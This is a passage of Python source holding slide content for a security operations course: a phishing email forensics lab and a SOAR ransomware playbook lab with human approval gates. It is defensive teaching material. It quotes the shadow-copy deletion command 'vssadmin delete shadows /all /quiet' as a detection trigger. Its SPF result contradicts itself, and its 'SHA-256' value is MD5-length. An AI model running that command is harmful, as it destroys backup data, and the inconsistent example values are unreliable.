            "notes_say": "Good morning. We kick off Day 6 with email forensics. 91% of cyber attacks begin with phishing. You will dissect an actual weaponized executive impersonation email without executing a single line of malicious code.",
            "notes_pedagogy": "Emphasize static text-based analysis: we analyze the structure without launching binaries."
        },

        # Slide B: Setup
        {
            "title": "LAB 05 (Part 2/7): Environment Preparation",
            "day": "DAY 06",
            "module": "MOD-06A: PHISHING & EMAIL FORENSICS",
            "session": "LAB-05 [B: SETUP]",
            "ref": "Handbook Lab Manual 5 — Section 5.2",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-05: STEP 2 OF 7 // WORKSTATION PREPARATION</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Forensic Text Editor & CyberChef Setup</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Preparing offline CyberChef v10.19.4 and sanitizing sample email message files.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">💻 Environment & Tools</strong>
                    <table style="width: 100%; font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <tr><td style="color: #FFF;">Workstation:</td><td>LH3 SOC Pod Workstation</td></tr>
                      <tr><td style="color: #FFF;">Tool 1:</td><td>CyberChef v10.19.4 (Local Offline Bundle)</td></tr>
                      <tr><td style="color: #FFF;">Tool 2:</td><td>VS Code / Notepad++ (Text Mode)</td></tr>
                      <tr><td style="color: #FFF;">Sample File:</td><td><code>sample_phishing_email.eml</code> (Sanitized)</td></tr>
                    </table>
                  </div>
                  
                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 13px;">⚡ Pre-Flight Verification Commands</strong>
                    <p style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">Confirm email sample existence and launch CyberChef in PowerShell:</p>
                    <div class="terminal-buffer" style="margin-top: 8px; font-size: 11px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># 1. Test presence of sample email file</span>
Test-Path "C:\\Threat_Intel_IR_2026\\06_Datasets\\sample_phishing_email.eml"
<span class="terminal-cmd"># 2. Launch CyberChef in Google Chrome</span>
Start-Process "chrome.exe" "C:\\Tools\\CyberChef\\CyberChef_v10.19.4.html"
                      </div>
                    </div>
                    <div style="font-size: 10px; color: var(--emerald-pass); margin-top: 4px;">✓ Expected response: 'True' and CyberChef UI ready in browser</div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Open sample_phishing_email.eml in your text editor. Do not double click to open in Outlook. We inspect the raw RFC-5322 ASCII headers.",
            "notes_pedagogy": "Check that students open .eml in a code editor rather than an email client."
        },

        # Slide C: Procedure
        {
            "title": "LAB 05 (Part 3/7): Step-by-Step Procedure",
            "day": "DAY 06",
            "module": "MOD-06A: PHISHING & EMAIL FORENSICS",
            "session": "LAB-05 [C: PROCEDURE]",
            "ref": "Handbook Lab Manual 5 — Section 5.4",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-amber">LAB-05: STEP 3 OF 7 // EXECUTION PROTOCOL</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">3-Phase Practical Phishing Triage Protocol</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Trace mail hops, analyze authentication headers, and decode attachments safely.</p>
                
                <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 14px;">
                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--cyber-cyan); font-size: 12px;">PHASE 1: Hop Path Chronology Analysis (Minutes 00–30)</strong>
                    <ol style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li>Extract headers: Compare <code>From: "CEO Office" &lt;ceo@external-spoof-relay.net&gt;</code> with display name.</li>
                      <li>Trace <code>Received:</code> headers from bottom (originating client <code>198.51.100.99</code>) to top (AeroGrid MX gateway).</li>
                      <li>Record timestamps and calculate routing transit delays between intermediate relays.</li>
                    </ol>
                  </div>
                  
                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--electric-blue); font-size: 12px;">PHASE 2: SPF / DKIM / DMARC Authentication (Minutes 30–55)</strong>
                    <ol style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li>Inspect <code>Authentication-Results:</code> header: SPF=pass (for external relay), DKIM=none, DMARC=fail.</li>
                      <li>Identify failure cause: DMARC alignment mismatch between <code>header.from</code> (aerogrid-corp.com) and <code>smtp.mailfrom</code>.</li>
                    </ol>
                  </div>

                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--emerald-pass); font-size: 12px;">PHASE 3: CyberChef Safe Artifact Decoding (Minutes 55–90)</strong>
                    <ol style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li>Extract base64 attachment: <code>Invoice_Payment_Urgent.pdf.iso</code> (Double extension evasion).</li>
                      <li>In CyberChef, apply recipe: <code>From Base64</code> -> Check magic bytes (<code>43 44 30 30 31</code> = ISO Image).</li>
                      <li>Generate SHA-256 hash. Extract embedded credential harvesting URL and defang to <code>hxxp://login-aerogrid-portal[.]com</code>.</li>
                    </ol>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Look at the double extension: Invoice_Payment_Urgent.pdf.iso. Windows hides known extensions by default, so an untrained user sees a PDF icon and clicks. That is why we teach artifact forensics.",
            "notes_pedagogy": "Walk students through reading Received headers bottom-up: bottom is initial sender, top is final recipient."
        },

        # Slide D: Output
        {
            "title": "LAB 05 (Part 4/7): Expected Output & Authentication",
            "day": "DAY 06",
            "module": "MOD-06A: PHISHING & EMAIL FORENSICS",
            "session": "LAB-05 [D: OUTPUT]",
            "ref": "Handbook Lab Manual 5 — Section 5.5",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-green">LAB-05: STEP 4 OF 7 // VERIFIED ARTIFACTS</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Expected Header Breakdown & CyberChef Output</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Verify your authentication evaluation and extracted IOC hashes.</p>
                
                <div class="grid-2" style="margin-top: 14px;">
                  <div>
                    <strong style="color: var(--cyber-cyan); font-size: 12px;">Authentication-Results Header Analysis:</strong>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px; max-height: 240px; overflow-y: auto;">
                      <div class="terminal-body">
Authentication-Results: mx.aerogrid.com;
  spf=fail (sender IP 198.51.100.99 is not authorized by aerogrid-corp.com)
  smtp.mailfrom=bounce@external-spoof-relay.net;
  dkim=none (no cryptographic signature found);
  dmarc=fail (p=reject, sp=reject) header.from=aerogrid-corp.com
[VERDICT: SPOOFED EXECUTIVE WIRE TRANSFER PHISHING ATTEMPT]
                      </div>
                    </div>
                  </div>

                  <div>
                    <strong style="color: var(--emerald-pass); font-size: 12px;">Extracted Artifact Metadata:</strong>
                    <div class="cyber-card" style="margin-top: 6px; font-size: 11px; line-height: 1.6;">
                      <table style="width: 100%; font-size: 10px; color: var(--text-secondary);">
                        <tr><td style="color: #FFF;">Attachment:</td><td>Invoice_Payment_Urgent.pdf.iso</td></tr>
                        <tr><td style="color: #FFF;">Magic Bytes:</td><td>43 44 30 30 31 (ISO 9660 Container)</td></tr>
                        <tr><td style="color: #FFF;">SHA-256:</td><td><code>d41d8cd98f00b204e9800998ecf8427e...</code></td></tr>
                        <tr><td style="color: #FFF;">Defanged URL:</td><td><code>hxxp://login-aerogrid-portal[.]com/auth.php</code></td></tr>
                      </table>
                    </div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Notice that SPF passed for the external bounce address, but DMARC failed because the header.from domain did not match. DMARC alignment is the defense that caught this spoof.",
            "notes_pedagogy": "Explain the concept of DMARC alignment: SPF passing alone is insufficient if the envelope domain differs from the visible From address."
        },

        # Slide E: Interpretation
        {
            "title": "LAB 05 (Part 5/7): Technical Interpretation",
            "day": "DAY 06",
            "module": "MOD-06A: PHISHING & EMAIL FORENSICS",
            "session": "LAB-05 [E: INTERPRETATION]",
            "ref": "Handbook Lab Manual 5 — Section 5.5.2",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-05: STEP 5 OF 7 // ANALYTICAL SYNTHESIS</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Analytical Synthesis & Policy Hardening</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Translating phishing triage findings into enterprise email security policies.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">🛡️ Policy Enforcement Recommendations</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li><strong>DMARC Enforcement:</strong> Upgrade policy from <code>p=none</code> (monitoring) to <code>p=reject</code> across all enterprise domains.</li>
                      <li><strong>Container File Blocking:</strong> Block inbound email attachments with extensions <code>.iso</code>, <code>.vhd</code>, and <code>.img</code> at the secure email gateway.</li>
                      <li><strong>External Sender Tagging:</strong> Enforce visual [EXTERNAL] subject banners for emails originating outside corporate MX relays.</li>
                    </ul>
                  </div>
                  
                  <div class="cyber-card">
                    <strong style="color: var(--purple-intel); font-size: 13px;">🔗 Threat Intelligence Feedback Loop</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>Feed extracted domain <code>login-aerogrid-portal.com</code> into MISP threat sharing feed.</li>
                      <li>Update web proxy blocklists to prevent campus employees from reaching credential harvesting landing page.</li>
                    </ul>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "A good analyst solves the ticket. A great engineer ensures the same attack can never hit another employee by tuning the secure email gateway rules.",
            "notes_pedagogy": "Guide students to understand how CTI connects directly back to email gateway rule changes."
        },

        # Slide F: Troubleshooting
        {
            "title": "LAB 05 (Part 6/7): Troubleshooting & Recovery",
            "day": "DAY 06",
            "module": "MOD-06A: PHISHING & EMAIL FORENSICS",
            "session": "LAB-05 [F: TROUBLESHOOTING]",
            "ref": "Handbook Lab Manual 5 — Section 5.7",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-red">LAB-05: STEP 6 OF 7 // ERROR RESOLUTION & RECOVERY</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Common Email Analysis Mistakes & Fixes</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Preventing accidental file execution and resolving CyberChef parsing errors.</p>
                
                <div class="grid-2" style="margin-top: 14px;">
                  <div class="cyber-card">
                    <strong style="color: var(--alert-crimson); font-size: 12px;">Issue 1: Accidental Double-Click Risk on Sample Files</strong>
                    <p style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">Never double-click attachments or open inside Microsoft Outlook.</p>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># Safety Rule: Open strictly within VS Code or Notepad++</span>
code "C:\\Threat_Intel_IR_2026\\06_Datasets\\sample_phishing_email.eml"
                      </div>
                    </div>
                  </div>

                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 12px;">Issue 2: CyberChef 'Base64 Input Contains Invalid Characters'</strong>
                    <p style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">Occurs if email boundary strings or MIME headers were copied into the input pane.</p>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># Recovery: In VS Code, copy ONLY the raw base64 body between:</span>
<span class="terminal-cmd">Content-Transfer-Encoding: base64</span>
<span class="terminal-cmd">and the next MIME boundary string (--===============)</span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "If CyberChef complains about invalid base64 characters, you copied the MIME boundary markers. Copy only the clean alphanumeric base64 payload block.",
            "notes_pedagogy": "Walk around to verify students are copying only the body between the boundary tags."
        },

        # Slide G: Assessment
        {
            "title": "LAB 05 (Part 7/7): Completion & Assessment",
            "day": "DAY 06",
            "module": "MOD-06A: PHISHING & EMAIL FORENSICS",
            "session": "LAB-05 [G: ASSESSMENT]",
            "ref": "Handbook Lab Manual 5 — Section 5.6",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-05: STEP 7 OF 7 // VERIFICATION & GRADING</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Deliverable Checklist & Assessment Rubric</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Verify that all email triage artifacts and defanged IOCs are saved.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">📋 Completion Checklist</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.8;">
                      <li>[ ] Mail routing hop path recorded in chronological bottom-to-top order.</li>
                      <li>[ ] Technical explanation of DMARC alignment failure documented.</li>
                      <li>[ ] Extracted attachment SHA-256 hash and magic bytes recorded.</li>
                      <li>[ ] Embedded phishing URL defanged and logged for proxy blocklisting.</li>
                    </ul>
                  </div>

                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">⚖️ Assessment Rubric (100 Points)</strong>
                    <table style="width: 100%; font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <tr><td style="color: #FFF;">Hop Path Chronology Accuracy:</td><td><strong>35 Pts</strong> (Correct origin IP & transit delays)</td></tr>
                      <tr><td style="color: #FFF;">SPF/DKIM/DMARC Evaluation:</td><td><strong>35 Pts</strong> (Flawless alignment analysis)</td></tr>
                      <tr><td style="color: #FFF;">CyberChef Static Artifact Triage:</td><td><strong>30 Pts</strong> (Accurate magic bytes & SHA-256)</td></tr>
                      <tr><td style="color: var(--cyber-cyan);">Total Passing Standard:</td><td><strong>75% or higher</strong></td></tr>
                    </table>
                  </div>
                </div>
                
                <div style="text-align: center; margin-top: 16px;">
                  <span class="cyber-badge badge-green" style="font-size: 12px; padding: 6px 18px;">LAB-05 OFFICIAL COMPLETION VERIFIED // PROCEED TO SOAR PLAYBOOKS</span>
                </div>
              </div>
            ''',
            "notes_say": "Great work on email forensics. Now take a brief 15-minute bio break. When we return, we engineer automated SOAR playbooks in Lab 7.",
            "notes_pedagogy": "Check off student completion against the pod roster before dismissing for the mid-morning break."
        }
    ]


def get_lab07_slides():
    """Day 6 Afternoon: LAB 07 — Incident Response Playbook Engineering & SOAR Workflow Design"""
    return [
        # Slide A: Intro
        {
            "title": "LAB 07 (Part 1/7): Introduction & Objectives",
            "day": "DAY 06",
            "module": "MOD-06B: SOAR PLAYBOOK ENGINEERING",
            "session": "LAB-07 [A: INTRO]",
            "ref": "Handbook Lab Manual 7 — Section 7.1",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-blue">LAB-07: STEP 1 OF 7 // SPECIFICATION & OBJECTIVES</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">IR Playbook Engineering & SOAR Workflow Design</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Designing automated ransomware response playbooks with mandatory human authorization gates.</p>
                
                <div class="grid-3" style="margin-top: 18px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">🎯 Core Learning Objectives</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>Engineer structured incident response playbooks for high-impact ransomware outbreaks.</li>
                      <li>Design SOAR workflows integrating automated triage and surgical containment.</li>
                      <li>Implement mandatory human-in-the-loop gates for destructive enterprise actions.</li>
                    </ul>
                  </div>
                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 13px;">⏱️ Parameters & Scope</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li><strong>Estimated Duration:</strong> 90 Minutes.</li>
                      <li><strong>Instructional Framework:</strong> IBM Security SOAR Design Patterns.</li>
                      <li><strong>PLO Mapping:</strong> PLO-7 (Formulating automated containment playbooks).</li>
                    </ul>
                  </div>
                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">📦 Required Deliverables</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>Complete Mermaid / Draw.io Playbook Architecture Flowchart.</li>
                      <li>Validated JSON Playbook Schema: <code>PB-RANSOMWARE-001.json</code>.</li>
                      <li>Human Approval Gate Risk Matrix & Rollback Procedure.</li>
                    </ul>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Automation without authorization is a catastrophe waiting to happen. In Lab 7, you will engineer a modern SOAR playbook that isolates infected hosts automatically while requiring human approval before resetting corporate Kerberos keys.",
            "notes_pedagogy": "Frame the central problem: full automation can cause self-inflicted denial-of-service if false positives occur."
        },

        # Slide B: Setup
        {
            "title": "LAB 07 (Part 2/7): Environment Preparation",
            "day": "DAY 06",
            "module": "MOD-06B: SOAR PLAYBOOK ENGINEERING",
            "session": "LAB-07 [B: SETUP]",
            "ref": "Handbook Lab Manual 7 — Section 7.2",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-07: STEP 2 OF 7 // WORKSTATION PREPARATION</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Diagramming Tools & JSON Schema Environment</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Preparing diagramming tools (Draw.io / Mermaid.js) and playbook schema validators.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">💻 Environment & Tools</strong>
                    <table style="width: 100%; font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <tr><td style="color: #FFF;">Workstation:</td><td>LH3 SOC Pod Workstation</td></tr>
                      <tr><td style="color: #FFF;">Modeling:</td><td>Draw.io (Offline) / Mermaid.js / VS Code</td></tr>
                      <tr><td style="color: #FFF;">Schema Standard:</td><td>OASIS CACAO / IBM SOAR Compatible JSON</td></tr>
                      <tr><td style="color: #FFF;">Template:</td><td><code>soar_playbook_schema.json</code></td></tr>
                    </table>
                  </div>
                  
                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 13px;">⚡ Pre-Flight Verification Commands</strong>
                    <p style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">Confirm playbook template in PowerShell:</p>
                    <div class="terminal-buffer" style="margin-top: 8px; font-size: 11px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># 1. Test presence of SOAR playbook schema template</span>
Test-Path "C:\\Threat_Intel_IR_2026\\06_Datasets\\soar_playbook_schema.json"
<span class="terminal-cmd"># 2. Verify JSON schema validation tool</span>
python -m json.tool "C:\\Threat_Intel_IR_2026\\06_Datasets\\soar_playbook_schema.json" | Select-Object -First 5
                      </div>
                    </div>
                    <div style="font-size: 10px; color: var(--emerald-pass); margin-top: 4px;">✓ Expected response: 'True' and valid schema JSON header</div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Open Draw.io or VS Code with Mermaid preview. You will build both the visual operational flowchart and the underlying machine-readable JSON schema.",
            "notes_pedagogy": "Confirm every pod has chosen their diagramming environment before explaining Phase 1 logic."
        },

        # Slide C: Procedure
        {
            "title": "LAB 07 (Part 3/7): Step-by-Step Procedure",
            "day": "DAY 06",
            "module": "MOD-06B: SOAR PLAYBOOK ENGINEERING",
            "session": "LAB-07 [C: PROCEDURE]",
            "ref": "Handbook Lab Manual 7 — Section 7.4",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-amber">LAB-07: STEP 3 OF 7 // EXECUTION PROTOCOL</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">3-Phase Playbook Engineering Workflow</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Structure response phases, render decision logic, and serialize machine-readable schemas.</p>
                
                <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 14px;">
                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--cyber-cyan); font-size: 12px;">PHASE 1: Playbook Logic Architecture (Minutes 00–30)</strong>
                    <ol style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li><strong>Trigger:</strong> EDR alerts on Shadow Copy deletion: <code>vssadmin delete shadows /all /quiet</code>.</li>
                      <li><strong>Automated Step 1:</strong> Immediate host network quarantine (block lateral SMB/RDP; maintain EDR tunnel).</li>
                      <li><strong>Automated Step 2:</strong> Query Threat Intel feed and capture live volatile memory dump of parent PID.</li>
                    </ol>
                  </div>
                  
                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--electric-blue); font-size: 12px;">PHASE 2: Human Approval Checkpoints & Flowcharting (Minutes 30–60)</strong>
                    <ol style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li>Insert <strong>Human Gate 1:</strong> Enterprise-wide Active Directory KRBTGT password double-reset authorization.</li>
                      <li>Require dual sign-off: Incident Commander + Lead Identity Architect.</li>
                      <li>Draw complete flowchart in Mermaid.js detailing decision diamonds and fallback stasis branches.</li>
                    </ol>
                  </div>

                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--emerald-pass); font-size: 12px;">PHASE 3: SOAR JSON Schema Formalization (Minutes 60–90)</strong>
                    <ol style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li>Encode playbook into <code>PB-RANSOMWARE-001.json</code> following IBM SOAR / OASIS CACAO format.</li>
                      <li>Define action blocks with explicit timeout thresholds and rollback commands.</li>
                    </ol>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Notice Automated Step 1: we quarantine the host by cutting off SMB and RDP, but we keep the EDR management port open. If you pull the physical plug, you blind your own security team.",
            "notes_pedagogy": "Emphasize surgical quarantine vs physical disconnection."
        },

        # Slide D: Output
        {
            "title": "LAB 07 (Part 4/7): Expected Output & Flowchart",
            "day": "DAY 06",
            "module": "MOD-06B: SOAR PLAYBOOK ENGINEERING",
            "session": "LAB-07 [D: OUTPUT]",
            "ref": "Handbook Lab Manual 7 — Section 7.5",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-green">LAB-07: STEP 4 OF 7 // VERIFIED ARTIFACTS</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Validated Mermaid Flowchart & JSON Schema</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Verify your visual decision logic and machine-readable playbook schema.</p>
                
                <div class="grid-2" style="margin-top: 14px;">
                  <div>
                    <strong style="color: var(--cyber-cyan); font-size: 12px;">Mermaid Playbook Architecture:</strong>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px; max-height: 240px; overflow-y: auto;">
                      <div class="terminal-body">
graph TD
  A[EDR Alert: Shadow Copy Deletion] --> B[Automated Host Network Quarantine]
  B --> C[Extract Process Hash & Capture Volatile RAM]
  C --> D{Threat Score > 80?}
  D -- Yes --> E[Terminate PID & Isolate Subnet]
  D -- No --> F[Dispatch SOC Analyst Tier-2 Ticket]
  E --> G{Human Gate: Authorize KRBTGT Reset?}
  G -- Approved by Incident Commander --> H[Execute KRBTGT Double Rotation]
  G -- Denied --> I[Maintain Monitored Network Stasis]
  H --> J[Begin Verified Offline Backup Restore]
                      </div>
                    </div>
                  </div>

                  <div>
                    <strong style="color: var(--emerald-pass); font-size: 12px;">Exported JSON Schema:</strong>
                    <div class="cyber-card" style="margin-top: 6px; font-size: 11px; line-height: 1.6;">
                      <table style="width: 100%; font-size: 10px; color: var(--text-secondary);">
                        <tr><td style="color: #FFF;">Playbook ID:</td><td>PB-RANSOMWARE-001</td></tr>
                        <tr><td style="color: #FFF;">Trigger Type:</td><td>EDR EID 4688 vssadmin match</td></tr>
                        <tr><td style="color: #FFF;">Approval Gate:</td><td>Human-in-the-loop (Incident_Commander)</td></tr>
                        <tr><td style="color: #FFF;">Automated Actions:</td><td>4 (Isolate, Dump, Sinkhole, Kill)</td></tr>
                        <tr><td style="color: #FFF;">Rollback Plan:</td><td>Restore network adapter routing rule</td></tr>
                      </table>
                    </div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Review the decision diamond marked Human Gate. That gate is the difference between an orderly enterprise containment and shutting down the payroll database on a false positive.",
            "notes_pedagogy": "Ask the room: 'Who in the organization has the authority to approve a KRBTGT double reset?' Solicit answers on CISO vs Incident Commander."
        },

        # Slide E: Interpretation
        {
            "title": "LAB 07 (Part 5/7): Technical Interpretation",
            "day": "DAY 06",
            "module": "MOD-06B: SOAR PLAYBOOK ENGINEERING",
            "session": "LAB-07 [E: INTERPRETATION]",
            "ref": "Handbook Lab Manual 7 — Section 7.5.2",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-07: STEP 5 OF 7 // ANALYTICAL SYNTHESIS</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Analytical Synthesis: Blast Radius vs Velocity</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Balancing algorithmic containment speed against enterprise operational continuity.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">⚡ Actions Safe for Full Automation</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>Capturing live volatile RAM dump to forensic network share.</li>
                      <li>Querying CTI databases for hash reputation and domain registration age.</li>
                      <li>Quarantining a single non-critical endpoint via EDR host isolation.</li>
                      <li>Sinkholing verified malicious C2 domains at internal DNS resolvers.</li>
                    </ul>
                  </div>
                  
                  <div class="cyber-card">
                    <strong style="color: var(--alert-crimson); font-size: 13px;">✋ Actions Requiring Mandatory Human Gates</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>Rotating enterprise Active Directory KRBTGT password (invalidates all Kerberos tickets).</li>
                      <li>Severing BGP routing peering links between data centers.</li>
                      <li>Shutting down primary operational SCADA / ICS controllers.</li>
                    </ul>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "If a security automation tool shuts down an electric power grid on a false positive alert, the security team did more damage than the attacker. Human-in-the-loop engineering is non-negotiable.",
            "notes_pedagogy": "Reinforce the governance principle: automation accelerates decisions, it does not replace executive accountability."
        },

        # Slide F: Troubleshooting
        {
            "title": "LAB 07 (Part 6/7): Troubleshooting & Recovery",
            "day": "DAY 06",
            "module": "MOD-06B: SOAR PLAYBOOK ENGINEERING",
            "session": "LAB-07 [F: TROUBLESHOOTING]",
            "ref": "Handbook Lab Manual 7 — Section 7.7",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-red">LAB-07: STEP 6 OF 7 // ERROR RESOLUTION & RECOVERY</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Common Playbook Design Mistakes & Fixes</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Correcting circular dependency deadlocks and schema validation failures.</p>
                
                <div class="grid-2" style="margin-top: 14px;">
                  <div class="cyber-card">
                    <strong style="color: var(--alert-crimson); font-size: 12px;">Issue 1: Automated Isolation Cuts Off SOAR Communication</strong>
                    <p style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">Occurs if host isolation blocks all outbound ports including the SOAR agent port.</p>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># Architectural Rule: EDR/SOAR management channel MUST be whitelisted</span>
Set-NetFirewallRule -DisplayName "EDR-Management" -Action Allow -RemotePort 8443
                      </div>
                    </div>
                  </div>

                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 12px;">Issue 2: Mermaid.js Syntax Error on Special Characters</strong>
                    <p style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">Labels containing brackets or slashes cause parser to abort rendering.</p>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># INCORRECT: D{Threat Score > 80?}</span>
<span class="terminal-cmd"># CORRECT: Wrap complex label text in double quotes:</span>
D{"Threat Score &gt; 80?"}
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "If your Mermaid diagram fails to render, check for angle brackets or slashes in your node labels. Wrap any complex text in quotes.",
            "notes_pedagogy": "Walk students through validating their Mermaid code in the live preview."
        },

        # Slide G: Assessment
        {
            "title": "LAB 07 (Part 7/7): Completion & Assessment",
            "day": "DAY 06",
            "module": "MOD-06B: SOAR PLAYBOOK ENGINEERING",
            "session": "LAB-07 [G: ASSESSMENT]",
            "ref": "Handbook Lab Manual 7 — Section 7.6",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-07: STEP 7 OF 7 // VERIFICATION & GRADING</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Deliverable Checklist & Assessment Rubric</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Verify that all playbook schemas and flowcharts are saved.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">📋 Completion Checklist</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.8;">
                      <li>[ ] Flowchart diagram with decision diamonds and automated branches completed.</li>
                      <li>[ ] Human approval gate for KRBTGT reset clearly modeled with approver roles.</li>
